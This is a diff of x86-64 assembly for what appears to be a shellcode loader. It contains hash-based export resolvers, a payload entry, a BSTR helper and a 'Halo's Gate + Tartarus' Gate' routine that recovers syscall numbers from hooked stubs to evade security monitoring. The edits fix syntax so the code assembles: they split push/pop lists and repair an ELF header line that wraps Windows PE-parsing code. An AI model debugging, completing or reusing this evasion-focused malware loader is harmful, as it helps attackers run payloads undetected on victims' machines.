@@ -182,7 +182,10 @@ _start:
 ; EXPORT RESOLVER (Loader)
 ; ========================================================================
 .get_export_by_hash_loader:
-    push rbx rsi rdi r8
+    push rbx
+    push rsi
+    push rdi
+    push r8
     mov rbx, rcx
     mov eax, [rbx+0x3C]
     add rbx, rax
@@ -223,7 +226,10 @@ _start:
     add rdi, rcx
     mov eax, [edi + rax*4]
     add rax, rcx
-    pop r8 rdi rsi rbx
+    pop r8
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 .next_loader:
     inc r8
@@ -536,10 +542,16 @@ payload_entry:
 ; Salida:  RAX = BSTR
 ; ========================================================================
 .sys_alloc_bstr:
-    push rcx rdx r8 r9
+    push rcx
+    push rdx
+    push r8
+    push r9
     mov rcx, rdx
     call qword [rbx + (pSysAllocString - payload_start)]
-    pop r9 r8 rdx rcx
+    pop r9
+    pop r8
+    pop rdx
+    pop rcx
     ret
 
 ; ========================================================================
@@ -556,7 +568,13 @@ payload_entry:
 ; HALO'S GATE + TARTARUS' GATE v7
 ; ========================================================================
 .resolve_ssn_halotartarus_v7:
-    push rbx rsi rdi r12 r13 r14 r15
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    push r13
+    push r14
+    push r15
     mov r12, rsi
     cmp byte [r12], 0xE9
     je .halo_scan_v7
@@ -621,14 +639,25 @@ payload_entry:
 .ssn_failed_v7:
     xor eax, eax
 .ssn_done_v7:
-    pop r15 r14 r13 r12 rdi rsi rbx
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 
 ; ========================================================================
 ; EXPORT RESOLVER (Payload)
 ; ========================================================================
 .get_export_by_hash_payload:
-    push rbx rsi rdi r8 r10 r11
+    push rbx
+    push rsi
+    push rdi
+    push r8
+    push r10
+    push r11
     mov rbx, rcx
     mov r10, rcx
     mov eax, [rbx+0x3C]
@@ -675,7 +704,12 @@ payload_entry:
     mov eax, [edi + rax*4]
     add rax, rcx
     mov r9d, r11d
-    pop r11 r10 r8 rdi rsi rbx
+    pop r11
+    pop r10
+    pop r8
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 .next_payload:
     inc r8
@@ -772,12 +806,12 @@ elf: db 0x7F, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00
     times 7 db 0
     dw 0x0002, 0x003E, 0x00000001
     dq _start - $$ + 0x400000
-    dq phdr - $$     dq 0x00000000, 0x00000000
+    dq phdr - $$, 0x00000000, 0x00000000
     dw 0x40, 0x38, 0x01
     dw 0x00, 0x00, 0x00
 phdr: dd 0x00000001, 0x00000005
     dq 0x0000000000000000, 0x0000000000400000, 0x0000000000400000
     dq filesize - $$, filesize - $$, 0x0000000000001000
-filesize equ $ - $$ ```
+filesize equ $ - $$
 
----
+
